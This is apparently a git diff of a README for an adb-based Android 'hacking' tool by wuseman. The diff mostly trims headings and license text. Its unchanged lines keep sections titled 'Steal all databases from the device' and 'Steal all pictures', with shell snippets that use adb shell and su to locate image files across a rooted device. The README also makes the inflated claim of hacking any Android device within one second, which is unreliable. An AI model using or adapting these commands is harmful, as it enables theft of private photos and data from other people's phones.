@@ -23,9 +23,6 @@ Hack random android device with 100% guarantee to succeed within 1 second.
 
     Install any linux distro from microsoft store and run commands above..
 
-
-## Tips & Tricks made by wuseman
-
 ### Steal all databases from the device ( require root )
 
     which su &> /dev/null
@@ -37,7 +34,6 @@ Hack random android device with 100% guarantee to succeed within 1 second.
     fi
 
 ### Steal all pictures: 
-##### A simple example: 
 
     PICS="$(adb shell 'su -c find / \( -name '*.png' -name '*.jpg*' \)')"
     for pictures in $PICS; do
@@ -62,18 +58,9 @@ Hack random android device with 100% guarantee to succeed within 1 second.
 
 - Android Debug Bridge (adb) - Find more info about _adb_ [here](https://developer.android.com/studio/command-line/adb)
 
-## Changelog
-
-[Versions changelog](CHANGELOG.md).
-
-## Authors: 
+### Author: 
 
 * **wuseman <wuseman@nr1.nu\>** 
-
-## License
-
-This project is licensed under the GNU General Public License v3.0 - see the [LICENSE.md](LICENSE.md) file for details
-
 
 ### Contact
 
